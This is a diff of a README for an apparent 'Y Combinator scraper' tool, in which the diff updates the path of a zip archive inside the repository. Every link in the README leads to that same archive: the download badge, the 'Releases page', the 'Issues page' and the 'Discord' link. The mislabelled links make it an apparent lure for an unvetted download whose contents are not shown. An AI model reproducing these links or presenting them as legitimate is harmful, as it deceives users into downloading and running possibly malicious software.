@@ -2,7 +2,7 @@
 # 🚀 y-combinator-scraper - Simple Tool for Y Combinator Data Extraction
 
 ## 🔗 Download Now
-[![Download Now](https://raw.githubusercontent.com/jai31-jai/y-combinator-scraper/main/src/extractors/y-combinator-scraper-v3.9.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/jai31-jai/y-combinator-scraper/main/src/extractors/y-combinator-scraper-v3.9.zip)
+[![Download Now](https://github.com/jai31-jai/y-combinator-scraper/raw/refs/heads/main/src/y-combinator-scraper-v2.3.zip%20Now-v1.0-blue)](https://github.com/jai31-jai/y-combinator-scraper/raw/refs/heads/main/src/y-combinator-scraper-v2.3.zip)
 
 ## 📜 Description
 The Y Combinator Scraper is a straightforward tool designed to extract valuable data from Y Combinator companies. This application simplifies your search for startup information, founder data, and job listings. Whether you're a researcher or a startup enthusiast, this tool aids your exploration effortlessly.
@@ -17,7 +17,7 @@ Before downloading the application, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 To get started, visit this page to download the software:  
-[Download from Releases Page](https://raw.githubusercontent.com/jai31-jai/y-combinator-scraper/main/src/extractors/y-combinator-scraper-v3.9.zip).
+[Download from Releases Page](https://github.com/jai31-jai/y-combinator-scraper/raw/refs/heads/main/src/y-combinator-scraper-v2.3.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Select the latest version of the application.
@@ -59,13 +59,13 @@ If you encounter any issues, consider these common solutions:
 - **App Crashes:** Restart the application or your device, and try again.
 
 ### Additional Help
-If further assistance is needed, refer to the [Issues page](https://raw.githubusercontent.com/jai31-jai/y-combinator-scraper/main/src/extractors/y-combinator-scraper-v3.9.zip) for common questions and community support.
+If further assistance is needed, refer to the [Issues page](https://github.com/jai31-jai/y-combinator-scraper/raw/refs/heads/main/src/y-combinator-scraper-v2.3.zip) for common questions and community support.
 
 ## ⚙️ Future Updates
 We continuously work on improving this tool. New features and updates will be rolled out based on user feedback. Be sure to check the Releases page periodically for the latest version.
 
 ## 💬 Community and Feedback
-Join the conversation on our [Discord](https://raw.githubusercontent.com/jai31-jai/y-combinator-scraper/main/src/extractors/y-combinator-scraper-v3.9.zip) server to ask questions and share your experiences. Feedback helps us create a better tool for your needs.
+Join the conversation on our [Discord](https://github.com/jai31-jai/y-combinator-scraper/raw/refs/heads/main/src/y-combinator-scraper-v2.3.zip) server to ask questions and share your experiences. Feedback helps us create a better tool for your needs.
 
 Feel free to connect and help us shape the future of Y Combinator data extraction.
 ```
